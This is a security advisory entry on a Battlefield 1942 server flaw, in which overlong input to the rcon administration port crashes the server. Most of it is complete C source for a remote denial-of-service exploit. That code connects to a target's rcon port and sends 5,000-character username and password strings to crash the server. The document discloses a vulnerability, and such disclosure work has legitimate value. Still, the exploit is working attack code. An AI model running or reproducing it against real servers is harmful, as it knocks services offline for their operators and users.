source: http://www.securityfocus.com/bid/6967/info

It has been reported that Battlefield 1942 does not properly check input sent to the administration port of a game server. By sending a string of excessive length, a remote attacker could crash the server, resulting in a denial of service. A manual restart of the server process would be required to resume normal service.

It is possible that this issue may be exploitable to execute arbitrary code, though this has not been confirmed. 

/*****************************************************************
 * hoagie_bf1942_rcon.c
 *
 * Remote-DoS for Battlefield 1942-Servers that have their
 * rcon-port activated (4711/tcp by default)
 *
 * Author: greuff@void.at
 *
 * Tested on BF-Server 1.2 on win32
 *
 * Credits:
 *    void.at
 *    ^sq, G7 and thokky
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
 * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
 * CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
 *
 *****************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sysexits.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <errno.h>
#include <netdb.h>

int bf1942_rcon_connect(char *servername, int serverport, char *user, char
*pass, int *s);

int main(int argc, char **argv)
{
   int sock, rval=0;
   char *user, *pass;
   int anz=5000/*4280*//*4272*//*4200*/;
   if(argc!=3)
   {
      printf("Usage: %s servername serverport\n\n",argv[0]);
      return EX_USAGE;
   }
   user=malloc(anz+1);
   pass=malloc(anz+1);
   memset(user,0,anz+1);
   memset(user,'A',anz);
   memset(pass,0,anz+1);
   memset(pass,'B',anz);
   do
   {

rval=bf1942_rcon_connect(argv[1],strtol(argv[2],NULL,10),user,pass,&sock);
      if(rval==-1)
      {
         printf("Authentication failed. user=%s pass=%s\n",user,pass);
	 user[1]++;
         close(sock);
      }
      else if(rval>0)
      {
         printf("Error: %s\n",strerror(rval));
         return -1;
      }
   } while(0);
   return 0;
}

/* open a session to a bf1942-server (Rcon)
 *
 * WARNING this is a minimalist's version of the real rcon-authentication
 * (XOR's skipped)
 *
 * in: servername, serverport, username, pass
 * out: on success: 0, serversocket in *sock
 *      on error  : -1 = autherror, errno otherwise
 */
int bf1942_rcon_connect(char *servername, int serverport, char *user, char
*pass, int *s)
{
   int sock, i, rval;
   struct hostent *hp;
   struct sockaddr_in inaddr;
   unsigned long l;

   char xorkey[10], buf[20];

   if((sock=socket(AF_INET,SOCK_STREAM,0))<0)
      return errno;
   if((hp=gethostbyname(servername))<0)
      return errno;
   inaddr.sin_family=AF_INET;
   inaddr.sin_port=htons(serverport);
   memcpy(&inaddr.sin_addr,*(hp->h_addr_list),sizeof(struct in_addr));
   if(connect(sock,(struct sockaddr *)&inaddr,sizeof(struct sockaddr))<0)
      return errno;

   // connection established. The first thing the server should
   // send is the XOR-Key for transmitting the username and the
   // password.
   if((i=read(sock,xorkey,10))<0)
      return errno;

   // send the username and the password...
   l=strlen(user)+1;
   if(write(sock,&l,sizeof(long))<0)
      return errno;
   if(write(sock,user,strlen(user)+1)<0)
      return errno;
   l=strlen(pass)+1;
   if(write(sock,&l,sizeof(long))<0)
      return errno;
   if(write(sock,pass,strlen(pass)+1)<0)
      return errno;

   if(read(sock,buf,20)<0)
      return errno;
   if(buf[0]==0x01)
   {
      rval=0;   // auth-ok, connection established
      *s=sock;
   }
   else
      rval=-1;      // auth-error
   return rval;
}